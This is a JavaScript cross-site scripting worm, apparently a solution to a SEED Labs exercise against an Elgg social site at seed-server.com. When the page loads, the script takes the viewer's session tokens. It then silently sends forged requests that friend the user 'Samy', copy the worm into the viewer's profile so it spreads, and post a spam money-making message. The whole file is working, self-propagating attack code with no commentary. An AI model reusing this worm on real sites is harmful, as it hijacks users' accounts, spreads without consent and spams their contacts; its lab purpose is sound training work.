<script id = "worm" type="text/javascript" >

    window.onload = function () {

        
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
        var guid = elgg.session.user.guid;
        var name = elgg.session.user.name;
        var random_string = "Bobby"
        //Construct the HTTP request to add Samy as a friend.

        var sendurl="http://www.seed-server.com/action/friends/add?friend=59" + ts + ts + token + token; //FILL IN
        console.log( sendurl )


        //Create and send Ajax request to add friend
        if(guid != 59)
        {

            var Ajax = null;
            Ajax=new XMLHttpRequest();
            Ajax.open("GET",sendurl,true);
            Ajax.setRequestHeader("Host","www.seed-server.com");
            Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
            Ajax.send();
            
        }

        var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
        var jsCode = document.getElementById("worm").innerHTML;
        var tailTag = "</" + "script>";
        var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
        

        sendurl="http://www.seed-server.com/action/profile/edit";
        
        var content= token + ts + "&name=" + name;

        content += '&description='+  wormCode +'&accesslevel%5Bdescription%5D=1';
        content += '&briefdescription='+random_string+'&accesslevel%5Bbriefdescription%5D=1'
        content += '&location='+random_string+'&accesslevel%5Blocation%5D=1'
        content += '&interests='+random_string+'&accesslevel%5Binterests%5D=1'
        content += '&skills='+random_string+'&accesslevel%5Bskills%5D=1'
        content += '&contactemail='+random_string+'%40gmail.com&accesslevel%5Bcontactemail%5D=1';
        content += '&phone='+random_string+'&accesslevel%5Bphone%5D=1';
        content += '&mobile='+random_string+'&accesslevel%5Bmobile%5D=1';
        content += '&website=http%3A%2F%2Fwww.'+random_string+'.com&accesslevel%5Bwebsite%5D=1';
        content += '&twitter='+random_string+'&accesslevel%5Btwitter%5D=1';
        content += '&guid='+guid; 

        if(guid != 59)
        {
            //Create and send Ajax request to modify profile
            var Ajax=null;
            Ajax=new XMLHttpRequest();
            Ajax.open("POST",sendurl,true);
            Ajax.setRequestHeader("Host","www.seed-server.com");
            Ajax.setRequestHeader("Content-Type",
            "application/x-www-form-urlencoded");
            Ajax.send(content);
        }

        var post = "To+earn+12+USD%2FHour%28%21%29%2C+visit+now+http%3A%2F%2Fwww.seed-server.com%2Fprofile%2fsamy"

        sendurl="http://www.seed-server.com/action/thewire/add"; 
        content= token + ts + "&body=" + post 
        
        
        if(guid != 59)
        {
            //Create and send Ajax request to modify profile
            var Ajax=null;
            Ajax=new XMLHttpRequest();
            Ajax.open("POST",sendurl,true);
            Ajax.setRequestHeader("Host","www.seed-server.com");
            Ajax.setRequestHeader("Content-Type",
            "application/x-www-form-urlencoded");
            Ajax.send(content);
        }

    }


</script>